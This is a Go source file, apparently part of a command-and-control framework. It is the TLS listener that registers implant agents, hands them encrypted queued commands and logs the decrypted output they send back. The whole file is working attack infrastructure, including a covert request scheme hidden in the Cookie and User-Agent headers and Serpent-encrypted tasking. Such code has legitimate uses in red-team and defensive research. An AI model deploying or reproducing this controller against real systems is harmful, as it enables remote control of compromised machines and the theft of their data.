package internal

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/brianvoe/gofakeit/v6"
)

type Listener struct {
	Port     string
	CertFile string
	KeyFile  string
	Key      []byte
}

func (l *Listener) callBackHandler(w http.ResponseWriter, r *http.Request) {
	id := r.Header.Get("User-Agent")
	body, err := io.ReadAll(r.Body)
	if err != nil {
		return
	}
	r.Body.Close()
	if body == nil {
		return
	}
	decryptedBody, err := SerpentDecrypt(body, l.Key)
	if err != nil {
		return
	}
	filePath := fmt.Sprintf("c2/data/%s.log", id)
	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open file: %s\n", err)
		return
	}
	defer f.Close()

	timestamp := time.Now().Format(time.RFC3339)
	if shell, err := ShellMap.Get(id); shell != nil && err == nil {
		shell.LCall = time.Now()
	}

	_, err = f.WriteString(fmt.Sprintf("%s\n%s\n", timestamp, string(decryptedBody)))
	if err != nil {
		fmt.Printf("Failed to write to file: %s\n", err)
		return
	}

	if shell, err := ShellMap.Get(id); shell != nil && err == nil && shell.Id == CurrentShell.Id {
		fmt.Printf("\n[*] Agent called back, sent %d bytes\n", len(decryptedBody))
		fmt.Println(string(decryptedBody))
		fmt.Printf("xShell %s> ", CurrentShell.Id)
	}
}

func (l *Listener) getTasksHandler(w http.ResponseWriter, r *http.Request) {
	id := r.Header.Get("User-Agent")
	if shell, err := ShellMap.Get(id); shell == nil && err != nil {
		host, _, _ := net.SplitHostPort(r.RemoteAddr)
		newShell := &Shell{
			Id:    id,
			Ip:    host,
			LCall: time.Now(),
			Cmds:  nil,
		}
		ShellMap.Add(newShell)
		os.Create(fmt.Sprintf("c2/data/%s.log", id))
	} else if shell != nil && shell.Cmds != nil {
		shell.LCall = time.Now()
		json, err := json.Marshal(shell.Cmds)
		if err != nil {
			return
		}
		encJson, err := SerpentEncrypt(json, l.Key)
		if err != nil {
			return
		}
		ShellMap.ClearCmds(id)
		w.Write(encJson)
	} else if shell != nil {
		shell.LCall = time.Now()
		w.Write(nil)
	} else {
		w.Write(nil)
	}
}

func (l *Listener) checkinHandler(w http.ResponseWriter, r *http.Request) {
	gofakeit.Seed(0)
	noun := gofakeit.Noun()
	adjective := gofakeit.Adjective()
	id := fmt.Sprintf("%s_%s", adjective, noun)
	id = strings.ToLower(id)
	encId, _ := SerpentEncrypt([]byte(id), []byte(l.Key))
	w.Write(encId)
}

func logRequest(handler http.Handler, log *log.Logger) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Received request %s %s\n", r.Method, r.URL)
		for name, headers := range r.Header {
			for _, h := range headers {
				log.Printf("%v: %v\n", name, h)
			}
		}
		handler.ServeHTTP(w, r)
	})
}

func (l *Listener) handler(w http.ResponseWriter, r *http.Request) {
	if id := r.Header.Get("Cookie"); id != "" {
		switch id {
		case "ci":
			l.checkinHandler(w, r)
		case "gt":
			l.getTasksHandler(w, r)
		case "cb":
			l.callBackHandler(w, r)
		default:
			return
		}
	}
}

func (l *Listener) StartListener() {
	logFile, err := os.OpenFile("c2/data/listener.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Error opening log file: %s", err.Error())
	}
	defer logFile.Close()

	errorLog := log.New(logFile, "ERROR: ", log.LstdFlags)
	requestLog := log.New(logFile, "REQUEST: ", log.LstdFlags)

	http.Handle("/", logRequest(http.HandlerFunc(l.handler), requestLog))

	server := &http.Server{
		Addr:     ":" + l.Port,
		ErrorLog: errorLog,
	}

	_ = server.ListenAndServeTLS(l.CertFile, l.KeyFile)
}
